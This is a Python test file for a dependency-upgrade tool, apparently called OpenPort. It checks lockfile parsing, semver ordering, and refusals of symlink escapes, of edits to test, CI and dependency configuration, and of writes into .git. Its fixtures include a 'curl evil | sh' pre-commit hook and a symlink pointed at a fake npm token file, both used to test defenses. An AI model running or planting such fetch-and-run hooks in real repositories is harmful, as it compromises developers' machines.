"""The upgrade's review findings: links, overrides, version order, what a fix may touch, and where PRs land."""

import json
import os
import shlex
import shutil
import subprocess
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from openport import config, github, sandbox
from openport.upgrade import Upgrade, plan_upgrades, read_lockfiles, testrun
from openport.upgrade.apply import (Edit, _remove_stubborn, apply_bumps, apply_edits, changed_files, copy_into, copy_problem, copy_repo,
                                    make_pr_folder)
from openport.upgrade.bump import bump_steps, crowded
from openport.upgrade.lockfiles import Dependency, parse_package_lock, parse_pnpm_lock, parse_yarn_lock
from openport.upgrade.osv import Advisory
from openport.upgrade.registry import parse_npm_releases, parse_pypi_releases
from openport.upgrade.research import official
from openport.upgrade.run import upgrade_repo
from openport.upgrade.select import Target, choose_target
from openport.upgrade.testrun import TestRun, run_in_container

AUTHKIT = Path(__file__).parents[1] / "examples" / "authkit"
NOW = datetime(2026, 10, 24, tzinfo=timezone.utc)
CUTOFF = datetime(2026, 10, 17, tzinfo=timezone.utc)


def passing(summary="5 passed"):
    return TestRun(True, 0, summary, summary, 1.0)


def failing(summary="1 failed"):
    return TestRun(False, 1, summary, summary, 1.0)


def plan(name, old, new, source, ecosystem="npm", also=()):
    target = Target(new, NOW, 43, fixed=["CVE-2024-0001"], still_open=[])
    return Upgrade(Dependency(name, old, ecosystem, source, tuple(also)), [Advisory("GHSA-x", "flaw", ["CVE-2024-0001"])], target, "upgrade")


def write(root: Path, files: dict[str, str]) -> Path:
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_bytes(text.encode("utf-8"))
    return root


def echoing(container):
    """A fake container that, like a real one, fails a step that only echoes why it can't run (bump._failing)."""
    def run(folder, image, command):
        if command.startswith("echo "):
            message = shlex.split(command.split(" && ")[0])[1]
            return TestRun(False, 1, message, message, 0.0)
        return container(folder, image, command)

    return run


@pytest.fixture
def link(monkeypatch):
    """make(path, target): `path` becomes a link to `target`. A real link where this account can make one (a junction
    for a folder on Windows); else a copy that Path.is_symlink reports as a link, which is what the code checks."""
    fake: set[str] = set()
    real = Path.is_symlink
    monkeypatch.setattr(Path, "is_symlink", lambda self: os.path.normcase(os.path.abspath(self)) in fake or real(self))

    def make(path: Path, target: Path) -> None:
        try:
            os.symlink(target, path, target_is_directory=target.is_dir())
            return
        except OSError:
            pass
        if target.is_dir() and os.name == "nt":
            import _winapi

            _winapi.CreateJunction(str(target), str(path))
            return
        (shutil.copytree if target.is_dir() else shutil.copyfile)(target, path)
        fake.add(os.path.normcase(os.path.abspath(path)))

    return make


# 1. What a bump brings back from the container ------------------------------------------------------------------

def test_a_file_the_container_swapped_for_a_link_never_comes_back(tmp_path, link):
    secret = write(tmp_path, {"home/.npmrc": "//registry.npmjs.org/:_authToken=npm_SECRET\n"}) / "home" / ".npmrc"
    root = write(tmp_path / "app", {"package.json": '{"dependencies": {"jsonwebtoken": "^8.5.1"}, "scripts": {"test": "node --test"}}',
                                    "package-lock.json": "{}"})

    def container(folder, image, command):  # a pnpmfile or a yarnPath can do this: package.json now leads out of the copy
        (folder / "package-lock.json").write_text('{"bumped": true}')
        (folder / "package.json").unlink()
        link(folder / "package.json", secret)
        return TestRun(True, 0, "", "", 1.0)

    run = upgrade_repo(root, tmp_path / "out", plans=[plan("jsonwebtoken", "8.5.1", "9.0.0", "package-lock.json")],
                       run_tests=lambda folder: passing(), run_container=container)
    assert run.upgraded == [] and "package.json isn't a regular file" in run.skipped[0][1]
    assert (tmp_path / "out" / "package.json").read_bytes() == (root / "package.json").read_bytes()
    assert (tmp_path / "out" / "package-lock.json").read_text() == "{}"  # nothing of that step came back
    assert "npm_SECRET" not in run.diff


def test_files_are_copied_only_between_regular_files_inside_both_folders(tmp_path, link):
    source = write(tmp_path / "src", {"a.txt": "new", "sub/b.txt": "new"})
    destination = write(tmp_path / "dst", {"a.txt": "old"})
    outside = write(tmp_path, {"outside/b.txt": "host file"}) / "outside"
    link(destination / "sub", outside)  # the PR's checkout holds a link where the file goes
    assert copy_problem(source, destination, "sub/b.txt") == "sub/b.txt would be written through a link, so it wasn't copied"
    with pytest.raises(ValueError):
        copy_into(source, destination, "sub/b.txt")
    assert (outside / "b.txt").read_text() == "host file"
    assert [copy_problem(source, destination, name) for name in ("../x", ".git/config", "missing.txt")] == [
        "../x isn't a file OpenPort copies", ".git/config isn't a file OpenPort copies",
        "missing.txt isn't a regular file there (it's a link, say), so it wasn't copied"]
    copy_into(source, destination, "a.txt")
    assert (destination / "a.txt").read_text() == "new"


# 2. A transitive package locked at several versions -------------------------------------------------------------

def test_an_override_never_forces_every_copy_of_a_package_to_one_version(tmp_path):
    lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/ms": {"version": "2.1.0"}, "node_modules/debug": {"version": "2.6.9"},
                                               "node_modules/debug/node_modules/ms": {"version": "2.0.0"}}}
    root = write(tmp_path / "app", {"package.json": '{"dependencies": {"debug": "^2.6.9"}, "scripts": {"test": "node --test"}}',
                                    "package-lock.json": json.dumps(lock)})
    commands = []

    def container(folder, image, command):
        commands.append(command)
        return TestRun(True, 0, "", "", 1.0)

    run = upgrade_repo(root, tmp_path / "out", plans=[plan("ms", "2.1.0", "2.1.3", "package-lock.json")],
                       run_tests=lambda folder: passing(), run_container=container)
    assert commands == [] and run.upgraded == []  # debug 2 asks for ms 2.0.0, which an "ms" override would move too
    assert run.skipped[0][1] == ("package-lock.json also locks ms 2.0.0, and an override would force every copy to 2.1.3: "
                                 "update what depends on ms 2.1.0 instead")
    assert b"overrides" not in (tmp_path / "out" / "package.json").read_bytes()

    write(tmp_path / "y", {"package.json": '{"dependencies": {"semver": "^7.5.0"}}',
                           "yarn.lock": '# yarn lockfile v1\n\nsemver@^5.6.0:\n  version "5.7.1"\n\nsemver@^7.5.0:\n  version "7.5.1"\n\n'
                                        'ms@^2.1.1:\n  version "2.1.2"\n'})
    # A direct dependency is added at its version, not overridden; a package locked once is fine.
    assert crowded(tmp_path / "y", "yarn.lock", {"semver": "7.5.4", "ms": "2.1.3"}) == {}
    (tmp_path / "y" / "package.json").write_text('{"dependencies": {}}')
    assert crowded(tmp_path / "y", "yarn.lock", {"semver": "7.5.4"}) == {"semver": ["5.7.1", "7.5.1"]}


# 3. npm versions are semver, not PEP 440 -------------------------------------------------------------------------

def days_ago(n):
    return NOW - timedelta(days=n)


def test_npm_versions_are_ordered_as_semver():
    fixed = Advisory("GHSA-a", "flaw", ranges=[{"introduced": "0", "fixed": "2.0.1"}])
    # 2.0.1-0 is a prerelease in npm (PEP 440 reads it as 2.0.1.post0: newer than the fix, and stable).
    assert choose_target("2.0.0", [fixed], {"2.0.1-0": days_ago(30)}, now=NOW, ecosystem="npm") is None
    assert choose_target("2.0.0", [fixed], {"2.0.1-0": days_ago(30), "2.0.1": days_ago(20)}, now=NOW, ecosystem="npm").version == "2.0.1"

    canary = Advisory("GHSA-b", "flaw", ranges=[{"introduced": "15.0.0-canary.0", "fixed": "15.0.5"}])
    # PEP 440 can't read the canary, which skipped the range: 15.0.3 looked like a fix.
    assert choose_target("14.2.0", [canary], {"15.0.3": days_ago(30)}, now=NOW, ecosystem="npm") is None
    assert choose_target("14.2.0", [canary], {"15.0.3": days_ago(30), "15.0.5": days_ago(20)}, now=NOW, ecosystem="npm").version == "15.0.5"
    unreadable = Advisory("GHSA-c", "flaw", ranges=[{"introduced": "not-a-version", "fixed": "2.0.0"}])
    assert choose_target("1.0.0", [unreadable], {"1.5.0": days_ago(30)}, now=NOW) is None  # counted as affected, to be safe


def test_an_installed_version_that_cant_be_read_is_held():
    advisory = Advisory("GHSA-a", "flaw", ranges=[{"introduced": "0", "fixed": "2.0.0"}])
    assert choose_target("main", [advisory], {"1.0.0": days_ago(30), "2.0.0": days_ago(20)}, now=NOW, ecosystem="npm") is None
    dep = Dependency("left-pad", "github:user/left-pad", "npm", "package-lock.json")
    up, = plan_upgrades([dep], find=lambda deps: [(dep, [advisory])], releases_for=lambda d: {"1.0.0": days_ago(30), "2.0.0": days_ago(20)},
                        now=NOW)
    assert up.target is None and up.status == "held: installed version unreadable"


# 4. Edits through links, and undoing them ------------------------------------------------------------------------

def test_an_edit_through_a_link_is_refused(tmp_path, link):
    folder = write(tmp_path / "repo", {"app.py": "x = 1\n", "tests/support/util.py": "y = 1\n"})
    link(folder / "helpers", folder / "tests" / "support")  # a link into the tests
    link(folder / "alias.py", folder / "app.py")
    edits = [Edit("helpers/util.py", "y = 1", "y = 2"), Edit("alias.py", "x = 1", "x = 2"), Edit("src/../app.py", "x = 1", "x = 2")]
    applied, rejected = apply_edits(folder, edits)
    assert applied == [] and [why for _, why in rejected] == [
        "it's a link, or inside one, so it could lead anywhere", "it's a link, or inside one, so it could lead anywhere", "outside the repo"]
    assert (folder / "tests" / "support" / "util.py").read_text() == "y = 1\n" and (folder / "app.py").read_text() == "x = 1\n"


def test_a_fix_that_fails_is_undone_by_its_files_real_paths(tmp_path):
    results = iter([passing(), failing(), failing()])  # before, after the bump, after the fix

    def fixer(upgrades, research, output, files, notes, paths=(), attempt=0):
        return [Edit("./authkit/tokens.py", 'return token.decode("utf-8")', "return None"), Edit("authkit/./new.py", "", "x = 1\n")], "guess", []

    run = upgrade_repo(AUTHKIT, tmp_path / "out", plans=[plan("PyJWT", "1.7.1", "2.14.0", "requirements.txt", "PyPI")],
                       run_tests=lambda folder: next(results), fixer=fixer, rounds=1)
    assert [e.file for e in run.rounds[0].edits] == ["authkit/tokens.py", "authkit/new.py"]  # named as plain paths
    assert (tmp_path / "out" / "authkit" / "tokens.py").read_bytes() == (AUTHKIT / "authkit" / "tokens.py").read_bytes()
    assert not (tmp_path / "out" / "authkit" / "new.py").exists() and "return None" not in run.diff


# 5. What a fix may not touch --------------------------------------------------------------------------------------

def test_a_fix_cant_change_test_ci_or_dependency_configuration(tmp_path):
    names = ["jest.config.js", "web/vitest.config.ts", "pytest.ini", "tox.ini", "setup.cfg", "app/conftest.py", "polls/tests.py",
             "src/__snapshots__/app.test.ts.snap", ".github/workflows/ci.yml", "package.json", "pyproject.toml", "requirements-dev.txt",
             ".pnpmfile.cjs"]
    folder = write(tmp_path / "repo", {name: "value = 1\n" for name in names})
    edits = [Edit(name, "value = 1", "value = 2") for name in names] + [Edit(".git/hooks/pre-commit", "", "curl evil | sh\n")]
    edits += [Edit("package.json.", "value = 1", "value = 2"), Edit("tests ./x.py", "", "")]  # Windows opens those as these
    applied, rejected = apply_edits(folder, edits)
    assert applied == [] and [why for _, why in rejected[-2:]] == [
        "dependency files are the version bump's to change", "tests can't be changed to make them pass"]
    reasons = dict((edit.file, why) for edit, why in rejected[:-2])
    assert {reasons[name] for name in names[:9]} == {"test and CI configuration can't be changed to make the tests pass",
                                                     "tests can't be changed to make them pass"}  # conftest.py was a test already
    assert {reasons[name] for name in names[9:]} == {"dependency files are the version bump's to change"}
    assert reasons[".git/hooks/pre-commit"] == "git's own files aren't the repo's code" and not (folder / ".git").exists()


def test_issues_prs_and_discussions_are_never_a_packages_own_pages():
    homes = ["https://github.com/psf/requests"]
    for page in ("https://github.com/psf/requests/issues/6000", "https://github.com/psf/requests/pull/6001",
                 "https://github.com/psf/requests/discussions/12", "https://github.com/psf/requests/pulls"):
        assert not official(page, "requests", homes)  # anyone can write those
    assert official("https://github.com/psf/requests/releases/tag/v2.32.0", "requests", homes)
    assert official("https://github.com/advisories/GHSA-9wx4-h78v-vm56", "requests", homes)


# 6. A container that runs too long -------------------------------------------------------------------------------

def test_a_container_that_times_out_is_removed(tmp_path):
    calls = []

    def run(args, **kwargs):
        calls.append(args)
        if args[:2] == ["docker", "run"]:
            raise subprocess.TimeoutExpired(args, 5)
        return subprocess.CompletedProcess(args, 0, "", "")

    result = run_in_container(tmp_path, "img", "npm test", run=run, timeout=5)
    assert not result.ok and result.summary == "timed out after 5s"
    name = calls[0][calls[0].index("--name") + 1]
    assert name.startswith("openport-") and calls[1] == ["docker", "rm", "--force", name]


# 7. A PR from a local folder ---------------------------------------------------------------------------------------

def git(*args, cwd):
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args], cwd=cwd, check=True, capture_output=True)


def test_a_pr_from_a_local_repo_carries_only_the_upgrade(tmp_path):
    repo = tmp_path / "repo"
    shutil.copytree(AUTHKIT, repo)
    git("init", "--quiet", cwd=repo)
    git("add", "-A", cwd=repo)
    git("commit", "--quiet", "-m", "start", cwd=repo)
    with (repo / "authkit" / "tokens.py").open("a") as tokens:
        tokens.write("# work in progress, not committed\n")
    (repo / "notes.txt").write_text("my own notes")  # untracked
    copy = copy_repo(repo, tmp_path / "copy")
    apply_bumps(copy, {"PyJWT": "2.14.0"})
    pr = make_pr_folder(repo, copy, changed_files(repo, copy), tmp_path / "pr")
    assert "not committed" not in (pr / "authkit" / "tokens.py").read_text() and not (pr / "notes.txt").exists()
    assert "PyJWT==2.14.0" in (pr / "requirements.txt").read_text()
    status = subprocess.run(["git", "status", "--porcelain"], cwd=pr, capture_output=True, text=True, check=True).stdout
    assert status.split() == ["M", "requirements.txt"]  # what `git add -A` stages there: the upgrade, nothing else


# 8. Release dates ---------------------------------------------------------------------------------------------------

def test_release_dates_skip_yanked_and_unpublished_releases_and_take_the_last_upload():
    pypi = {"releases": {
        "2.31.0": [{"upload_time_iso_8601": "2024-05-29T12:00:00Z"}, {"upload_time_iso_8601": "2026-10-20T12:00:00Z"}],  # a wheel added late
        "2.32.0": [{"upload_time_iso_8601": "2024-06-01T12:00:00Z", "yanked": True}],
    }}
    assert parse_pypi_releases(pypi) == {"2.31.0": datetime(2026, 10, 20, 12, tzinfo=timezone.utc)}
    npm = {"time": {"created": "2020-01-01T00:00:00Z", "1.0.0": "2023-01-01T00:00:00Z", "1.0.1": "2023-02-01T00:00:00Z",
                    "1.0.2": "2023-03-01T00:00:00Z"},
           "versions": {"1.0.0": {}, "1.0.2": {"deprecated": "use 2.x"}}}  # 1.0.1 was unpublished
    assert set(parse_npm_releases(npm)) == {"1.0.0"}
    assert set(parse_npm_releases(npm, deprecated=True)) == {"1.0.0", "1.0.2"}  # what a lockfile may already hold


# 9. Hash-pinned requirements ------------------------------------------------------------------------------------------

def test_a_requirement_pinned_with_hashes_is_skipped(tmp_path):
    root = write(tmp_path / "app", {"requirements.txt": "PyJWT==1.7.1 \\\n    --hash=sha256:aaaa\nrequests==2.31.0\n"})
    run = upgrade_repo(root, tmp_path / "out", run_tests=lambda folder: passing(),
                       plans=[plan("pyjwt", "1.7.1", "2.14.0", "requirements.txt", "PyPI"),
                              plan("requests", "2.31.0", "2.33.0", "requirements.txt", "PyPI")])
    assert [p.dep.name for p in run.upgraded] == ["requests"] and "--hash" in run.skipped[0][1]
    assert (tmp_path / "out" / "requirements.txt").read_text() == "PyJWT==1.7.1 \\\n    --hash=sha256:aaaa\nrequests==2.33.0\n"


# 10. Lockfile names --------------------------------------------------------------------------------------------------

def names(deps):
    return {(d.name, d.version) for d in deps}


def test_aliases_and_pnpm_v5_peers_are_read_as_the_real_package():
    v3 = {"lockfileVersion": 3, "packages": {
        "": {"name": "app"}, "node_modules/string-width-cjs": {"name": "string-width", "version": "4.2.3"},
        "node_modules/string-width": {"version": "5.1.2"}, "packages/ui": {"name": "ui", "version": "1.0.0"},
        "node_modules/ui": {"resolved": "packages/ui", "link": True}}}
    assert names(parse_package_lock(json.dumps(v3))) == {("string-width", "4.2.3"), ("string-width", "5.1.2")}
    v1 = {"lockfileVersion": 1, "dependencies": {"string-width-cjs": {"version": "npm:string-width@4.2.3"}, "@x/y": {"version": "1.0.0"}}}
    assert names(parse_package_lock(json.dumps(v1))) == {("string-width", "4.2.3"), ("@x/y", "1.0.0")}
    yarn = '# yarn lockfile v1\n\n"string-width-cjs@npm:string-width@^4.2.0":\n  version "4.2.3"\n'
    assert names(parse_yarn_lock(yarn)) == {("string-width", "4.2.3")}
    pnpm = ("lockfileVersion: 5.4\npackages:\n  /react-dom/18.2.0_react@18.2.0:\n    dev: false\n"
            "  /@testing-library/react/14.0.0_biqbaboplfbrettd7655fr4n2y:\n    dev: true\n  /string_decoder/1.3.0:\n    dev: false\n")
    assert names(parse_pnpm_lock(pnpm)) == {("react-dom", "18.2.0"), ("@testing-library/react", "14.0.0"), ("string_decoder", "1.3.0")}


# 11. A package whose own lockfile can't move ----------------------------------------------------------------------------

def test_a_package_whose_own_lockfile_fails_isnt_bumped_anywhere(tmp_path):
    root = write(tmp_path / "app", {
        "package.json": '{"packageManager": "bun@1.3.1", "dependencies": {"jsonwebtoken": "^8.5.1"}, "scripts": {"test": "bun test"}}',
        "package-lock.json": '{"lockfileVersion": 3, "packages": {"": {}, "node_modules/jsonwebtoken": {"version": "8.5.1"}}}',
        "bun.lock": '{"lockfileVersion": 1, "packages": {"jsonwebtoken": ["jsonwebtoken@8.5.1", "", {}, "sha512-x"]}}'})
    dep, = read_lockfiles(root)
    assert (dep.source, dep.also) == ("bun.lock", ("package-lock.json",))
    commands = []

    def container(folder, image, command):
        commands.append(command)
        if "bun" in command:
            return TestRun(False, 1, "error: bun refused", "", 1.0)
        (folder / "package-lock.json").write_text('{"bumped": true}')
        return TestRun(True, 0, "", "", 1.0)

    up = plan("jsonwebtoken", "8.5.1", "9.0.0", "bun.lock", also=("package-lock.json",))
    run = upgrade_repo(root, tmp_path / "out", plans=[up], run_tests=lambda folder: passing(), run_container=container)
    assert run.upgraded == [] and run.skipped[0][1] == "bun.lock couldn't be updated: bun refused"
    assert len(commands) == 1 and "bun" in commands[0]  # its own lockfile first, and the other left alone
    assert (tmp_path / "out" / "package-lock.json").read_bytes() == (root / "package-lock.json").read_bytes()

    py = write(tmp_path / "py", {"poetry.lock": '[[package]]\nname = "requests"\nversion = "2.31.0"\n', "requirements.txt": "requests==2.31.0\n"})
    dep, = read_lockfiles(py)
    up = plan("requests", "2.31.0", "2.33.0", dep.source, "PyPI", also=dep.also)
    run = upgrade_repo(py, tmp_path / "out2", plans=[up], run_tests=lambda folder: passing(),
                       run_container=lambda *args: TestRun(False, 1, "error: poetry lock failed", "", 1.0))
    assert run.upgraded == [] and (tmp_path / "out2" / "requirements.txt").read_text() == "requests==2.31.0\n"  # the pin stays too


# 13. Removing a tree ----------------------------------------------------------------------------------------------------

def test_removing_a_tree_never_chmods_through_a_link(tmp_path, link, monkeypatch):
    host = write(tmp_path, {"host/passwd": "root:x:0:0\n"}) / "host" / "passwd"
    link(tmp_path / "copy-link", host)
    changed = []
    monkeypatch.setattr(os, "chmod", lambda path, mode: changed.append(path))
    _remove_stubborn(os.unlink, str(tmp_path / "copy-link"), OSError("Access is denied"))
    assert changed == [] and host.read_text() == "root:x:0:0\n"


# 14. A source folder called runs --------------------------------------------------------------------------------------

def test_a_source_folder_called_runs_is_copied_and_editable(tmp_path):
    root = write(tmp_path / "app", {"app/api/runs/route.ts": "export const GET = 1;\n", "runs/upgrades/app/x.txt": "OpenPort's output",
                                    "pkg/venv/lib.py": "", "web/node_modules/a.js": ""})
    copy = copy_repo(root, tmp_path / "copy")
    assert (copy / "app/api/runs/route.ts").is_file() and not (copy / "runs").exists()
    assert not (copy / "pkg/venv").exists() and not (copy / "web/node_modules").exists()
    edit = Edit("app/api/runs/route.ts", "= 1", "= 2")
    assert apply_edits(copy, [edit]) == ([edit], []) and changed_files(root, copy) == ["app/api/runs/route.ts"]


# 15. Plausible input that used to crash --------------------------------------------------------------------------------

def test_odd_input_is_rejected_or_skipped_not_a_crash(tmp_path, link):
    folder = write(tmp_path / "repo", {"src/utils.py": "x = 1\n", "logo.py": ""})
    (folder / "logo.py").write_bytes(b"\x89PNG\r\n\x1a\n\xff\xfe")
    applied, rejected = apply_edits(folder, [Edit("src/utils.py/new.py", "", "y = 1\n"), Edit("logo.py", "PNG", "JPG")])
    assert applied == [] and [why for _, why in rejected] == ["src/utils.py is a file, not a folder", "not a UTF-8 text file"]

    bom = write(tmp_path / "bom", {"package.json": '\ufeff{\n  "dependencies": {"jsonwebtoken": "^8.5.1"},\n  "scripts": {"test": "x"}\n}\n'})
    step, = bump_steps(bom, {"package-lock.json": {"jsonwebtoken": "9.0.0", "semver": "7.5.4"}}, CUTOFF)
    assert "jsonwebtoken@9.0.0" in step.command and step.writes["package.json"].startswith('\ufeff{\n  "dependencies"')
    assert testrun.test_setups(bom, {"npm"})[0][2] == testrun.NODE_TESTS  # its test script is found

    linked = tmp_path / "linked"
    linked.mkdir()
    link(linked / "package.json", bom / "package.json")
    refused, = bump_steps(linked, {"package-lock.json": {"jsonwebtoken": "9.0.0"}}, CUTOFF)
    assert refused.command.startswith("echo ") and "package.json is a link" in refused.command and refused.writes == {}

    root = write(tmp_path / "app", {"package.json": '{"dependencies": {"jsonwebtoken": "^8.5.1"}}', "package-lock.json": "{}"})

    def garbled(folder, image, command):
        (folder / "package-lock.json").write_text("{ not json")
        return TestRun(True, 0, "", "", 1.0)

    run = upgrade_repo(root, tmp_path / "out", plans=[plan("jsonwebtoken", "8.5.1", "9.0.0", "package-lock.json")],
                       run_tests=lambda folder: passing(), run_container=garbled)
    assert run.upgraded == [] and run.skipped[0][1].startswith("package-lock.json couldn't be updated: the new package-lock.json couldn't be read")


# 16. --out ---------------------------------------------------------------------------------------------------------------

def test_out_never_removes_a_folder_openport_didnt_make(tmp_path, monkeypatch):
    root = write(tmp_path / "repo", {"app.py": "x = 1\n"})
    mine = write(tmp_path / "mine", {"thesis.tex": "years of work"})
    with pytest.raises(FileExistsError):
        copy_repo(root, mine)
    assert (mine / "thesis.tex").read_text() == "years of work"
    for out in (root, tmp_path, root / "src" / "out"):  # the repo itself, a folder holding it, or one inside it
        with pytest.raises(ValueError):
            copy_repo(root, out)
    assert (root / "app.py").is_file()

    copy_repo(root, root / "runs" / "upgrades" / "repo")  # where the weekly workflow puts it: copies skip runs/
    again = copy_repo(root, tmp_path / "out")
    (again / "stale.txt").write_text("from the last run")
    assert not (copy_repo(root, again) / "stale.txt").exists()  # an upgrade's own folder is replaced
    with pytest.raises(FileExistsError):
        make_pr_folder(root, again, [], mine)
    monkeypatch.setattr(config, "RUNS_DIR", tmp_path / "runs")
    managed = write(tmp_path / "runs" / "upgrades" / "repo", {"old.txt": ""})
    assert not (copy_repo(root, managed) / "old.txt").exists()

    with pytest.raises(FileExistsError):  # `openport upgrade --apply --out mine` refuses it the same way
        upgrade_repo(root, mine, plans=[plan("PyJWT", "1.7.1", "2.14.0", "requirements.txt", "PyPI")], run_tests=lambda folder: passing())
    assert (mine / "thesis.tex").read_text() == "years of work"


# 17 and 18. The PR body, and the fork it's pushed to -------------------------------------------------------------------

def test_pr_bodies_defuse_every_kind_of_reference():
    body = ("Fixes acme/app#12 (see http://github.com/acme/app/pull/3, www.github.com/acme/app/issues/4 and "
            "https://GitHub.com/acme/app/commit/abc123), thanks @someone. Docs: https://github.com/acme/app#readme")
    assert sandbox.quiet(body) == (
        "Fixes acme/app#\u200b12 (see https://redirect.github.com/acme/app/pull/3, https://redirect.github.com/acme/app/issues/4 and "
        "https://redirect.github.com/acme/app/commit/abc123), thanks @\u200bsomeone. Docs: https://github.com/acme/app#readme")
    assert sandbox.quiet(sandbox.quiet(body)) == sandbox.quiet(body)


def test_the_cli_posts_a_quiet_body_and_pushes_to_the_fork_github_names(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    repo.mkdir()
    git("init", "--quiet", cwd=repo)
    git("remote", "add", "origin", "https://github.com/acme/authkit.git", cwd=repo)
    body = tmp_path / "pr-upgrade.md"
    body.write_text("Thanks @someone; this fixes acme/authkit#7.\n", encoding="utf-8")
    plan_ = github.plan_pr(repo, "Upgrade", body, "me", branch=github.UPGRADE_BRANCH)
    posted = Path(plan_.commands[-1][-1])
    assert posted != body and posted.read_text(encoding="utf-8") == "Thanks @\u200bsomeone; this fixes acme/authkit#\u200b7.\n"
    assert plan_.commands[3] == ["gh", "api", "--method", "POST", "repos/acme/authkit/forks", "--jq", ".full_name"]
    assert github.plan_pr(repo, "Upgrade", body, "ACME").fork == "acme/authkit"  # logins aren't case-sensitive

    ran = []

    def run(command, cwd=None):
        ran.append(command)
        if command[:2] == ["gh", "api"]:
            return answer
        return "https://github.com/me/authkit-1/pull/1" if command[:3] == ["gh", "pr", "create"] else ""

    monkeypatch.setattr(github, "_run", run)
    answer = "me/authkit-1\n"  # `me/authkit` is an unrelated repo of mine, so GitHub named the fork authkit-1
    assert github.execute(plan_, repo) == "https://github.com/me/authkit-1/pull/1"
    assert ["git", "push", "--force", "https://github.com/me/authkit-1.git", github.UPGRADE_BRANCH] in ran
    assert ran[-1][ran[-1].index("--repo") + 1] == "me/authkit-1"

    ran.clear()
    answer = "acme/authkit\n"  # not a fork of mine: nothing is pushed
    with pytest.raises(ValueError, match="didn't answer with a fork of yours"):
        github.execute(plan_, repo)
    assert not any(command[:2] == ["git", "push"] for command in ran)


# 19. The sandbox's copy ------------------------------------------------------------------------------------------------

def test_the_sandbox_never_copies_into_git(tmp_path):
    source = write(tmp_path / "src", {".git/hooks/pre-commit": "curl evil | sh", ".GIT/config": "[core]"})
    for name in (".git/hooks/pre-commit", ".GIT/config"):
        with pytest.raises(sandbox.GitHubError, match="is in .git"):
            sandbox._copy(source, tmp_path / "dst", [name])
    assert not (tmp_path / "dst").exists()
